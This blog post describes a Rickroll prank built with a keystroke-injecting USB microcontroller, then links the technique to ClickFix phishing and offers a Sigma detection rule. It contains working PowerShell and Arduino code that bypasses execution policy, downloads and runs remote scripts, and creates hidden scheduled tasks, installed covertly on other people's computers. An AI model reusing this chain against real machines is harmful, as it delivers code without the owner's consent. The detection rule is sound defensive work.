---
layout: post
title: "Operation: Get Ricked"
description: "Using knowledge about ClickFix phishing campaigns and hardware hacking to Rickroll my friends and family."
date: 2025-04-01
image_base: /assets/images/posts/2025-04-01-Operation-Get-Ricked
tags: ["Meme", "Hacking", "Detection Engineering"]
---

Introduction
------------

Everyone loves a good Rickroll — especially me. Rick has been the star of most of my projects (like my Cheap Yellow Display Rick Ascii project) and unsurprisingly, my plan for 2025’s April Fools’ Day was no exception.

![Rick Ascii on a CYD](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VW6X2dKtxduLkBKKB-SuXw.gif)

I wanted to simultaneously Rickroll multiple friends and family with Rick’s beautiful vocals with the following two requirements:

1.  No end user interaction.
2.  No apparent evidence that I had tampered with or touched their computers.

Let the Games Begin!
--------------------

The easiest method for achieving my self-imposed goals would be with Windows scheduled tasks created via commandline. To start, I wrote this Rickroll PowerShell script, `GetRicked.ps1` that would be executed by a triggered scheduled task. The script downloads a Rickroll `.mp3` audio file from my [GitHub repository](https://github.com/CyberSpooon) to the current user’s temp directory. Once downloaded, it opens and plays the audio file with Windows Media Player (`wmplayer.exe`) hidden in the background. This script was saved to GitHub for later use.

```bash
Set-ExecutionPolicy -Scope CurrentUser Bypass
$audio = "https://github.com/CyberSpooon/GetRicked/raw/refs/heads/main/Get_Ricked.mp3"
$path = "$env:TEMP\Get_Ricked.mp3"
Start-Process curl.exe -WindowStyle Hidden -ArgumentList "-L $audio -o $path" ## Download .mp3
Start-Sleep -Seconds 3 ## wait for .mp3 to download
Start-Process "wmplayer.exe" -ArgumentList "$path" -WindowStyle Hidden ## open .mp3 in hidden media player window
```

Next, I wrote a second PowerShell script, `scheduletherickoning.ps1` that would create a scheduled task on the target machine and run the first script, `GetRicked.ps1` at 10:30 AM, April Fools’ Day. This script was also uploaded to GitHub.

```bash
Set-ExecutionPolicy -Scope CurrentUser Bypass
$runtime = Get-Date "2025-04-01 10:30"
$taskname = "GetRicked"
$task = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
$trigger = New-ScheduledTaskTrigger -Once -At $runTime
Register-ScheduledTask -Action $task -Trigger $trigger -TaskName $taskName -Description "Get rickity rickity ricked son!"
```

Figuring out how to distribute my creation en masse was my biggest challenge. It would be pretty obvious I was up to something fishy if I were to mash run commands into someone's computer the second their back was turned. So I devised a more elegant solution… In Summer 2024 I attended Patrick Schweickert’s Building hacker gadgets workshop at Bsides NOVA. In the workshop, we programmed malicious USB microcontrollers using Arduino IDE. This would be my weapon of choice.

I re-flashed the microcontroller with the code below programming it to do the following when plugged in to a windows machine:

1.  Open a run window with the Windows + R shortcut
2.  Paste and run the previously described `scheduletherickoning.ps1` scheduled task script from GitHub.

```bash
#include <Keyboard.h>
void setup() {
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI); // Press Windows + R
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500); // Wait for run window
  // Type command
  Keyboard.print( 
    "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
  );
  delay(900);
  Keyboard.press(KEY_RETURN); // Press Enter
  Keyboard.release(KEY_RETURN);
}
void loop() {
}
```

(Fun fact, the run window has a character limit of 259 characters which caused me some problems initially. This is because in the Windows API, the maximum length for a path is defined by MAX_PATH which is 259 characters + a single invisible terminating null character.)

With my newly flashed USB microcontroller in hand, I swiftly jammed it into the nearest windows machines I could find, unbeknownst to the poor users who would soon be Rickrolled by a ghost in the shell. To my delight, it worked perfectly and April Fools’ 2025 was a success!

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qOv1olgldhhAHR-k1boEMA.jpeg)

In the Wild…
------------

While this may just seem like a harmless prank, the techniques used here have real world implications. On March 13, 2025 Microsoft Threat Intelligence published a [report](https://www.microsoft.com/en-us/security/blog/2025/03/13/phishing-campaign-impersonates-booking-com-delivers-a-suite-of-credential-stealing-malware) detailing an increasingly popular social engineering technique dubbed ClickFix. Microsoft states that in the case of a ClickFix phishing attempt, “…the user is prompted to use a keyboard shortcut to open a Windows Run window, then paste and launch a command that the phishing page adds to the clipboard.”

![Example of a ClickFix phishing page I found on URLhaus (https://urlhaus.abuse.ch/url/3496862)](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yCAKcNMRthnHf5GjYiv4tg.png)![Text pasted to the clipboard by the ClickFix phishing page.](https://miro.medium.com/v2/resize:fit:472/format:webp/1*34d9ViN9uP0QX7IoOFTNKQ.png)

If you saw the microcontroller code from earlier, you will notice the same general idea.

*   Step 1: Open windows run window with shortcut and paste bad code
*   Step 2: ????
*   Step 3: Profit

![captionless image](https://miro.medium.com/v2/resize:fit:1280/format:webp/0*kHB81LlfF5900GFZ.png)

While the pasted code in real sample above (this one is tagged as [Lumma Stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.lumma)) leads to a much nastier result than a nearly two decade old bait-and-switch meme, it goes to show that this simple attack vector works extremely well for cybercriminals. While phishing emails are the norm for most attackers, what is stopping an evil doer from littering malicious USBs with the same code around a office parking lot waiting for a curious user to plug it in to their computer?

Detection Opportunities
-----------------------

Unfortunately there is no silver bullet when it comes to cybersecurity. A multi-layered defense is critical in ensuring the safety of data and businesses alike. However, a fantastic security layer for enterprises to employ is a detection and response solution that allows for the implementation of custom detection logic like Sigma rules. [Sigma](https://sigmahq.io) is a generic, open, and structured detection format that allows security teams to detect relevant log events in a simple and shareable way. To easily implement Sigma rules in your own environment, use a tool like [Detection Studio](https://detection.studio) which allows you to translate any Sigma rule into the query logic for your SIEM of choice. This can hugely improve detection and response capability in addition to providing easy threat hunting opportunities.

To detect possible ClickFix phishing attempts (or would-be Rickrollers) in your own environment, we can take a look at the `\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` registry key which logs all commands executed in the run window.

![captionless image](https://miro.medium.com/v2/resize:fit:1388/format:webp/1*1EvtmhANKJJjgG1vt-_eCA.png)

Searching for PowerShell badness like `iex`, `iwr`, `https`, and `invoke`, etc within this key can give us a high fidelity, low false positive detection rule. To aid in the detection of this malicious behavior, I wrote a Sigma rule to find this exact kind of activity.

```bash
title: Possible ClickFix Phishing Attempt
id: 9decb4bd-62de-453c-8e06-ddb4f63977c8
status: test
description: Detects execution of commands associated with ClickFix via windows run dialog box
references:
    - https://www.microsoft.com/en-us/security/blog/2025/03/13/phishing-campaign-impersonates-booking-com-delivers-a-suite-of-credential-stealing-malware/
    - https://www.forensafe.com/blogs/runmrukey.html
    - https://github.com/SigmaHQ/sigma/blob/78a78c79ffd2998cd864618c538395a4e8c23902/rules/windows/registry/registry_set/registry_set_runmru_susp_command_execution.yml
author: CyberSpooon @CyberSpooon
date: 2025-04-01
modified: 2025-04-01
tags:
    - attack.execution
logsource:
    product: windows
    service: registry_set
detection:
    selection_key:
        TargetObject|contains: '\Windows\CurrentVersion\Explorer\RunMRU'
    selection_suspicious_keywords_execution:
        Details|contains:
            - 'iex'
            - 'iwr'
            - 'Invoke-'
            - 'http'
            - 'powershell'
            - 'pwsh'
            - '-uri'
            - 'Hidden'
            - '-W'
            - 'ftp'
            - 'wmic'
            - 'process call create'
            - 'mshta'
    selection_suspicious_keywords_encoding:
        Details|contains:
            - '-e '
            - '-ec '
            - '-en '
            - '-enc '
            - '-enco'
    condition: selection_key and (all of selection_suspicious_keywords_execution or all of selection_suspicious_keywords_encoding)
falsepositives:
    - Unknown
level: medium
```

_If you made it this far, thanks for never giving me up, never letting me down, never running around or deserting me. I appreciate you taking the time to read my blog! :)_

![captionless image](https://miro.medium.com/v2/resize:fit:612/format:webp/1*dIdOgEORHceWk-seVG2oow.gif)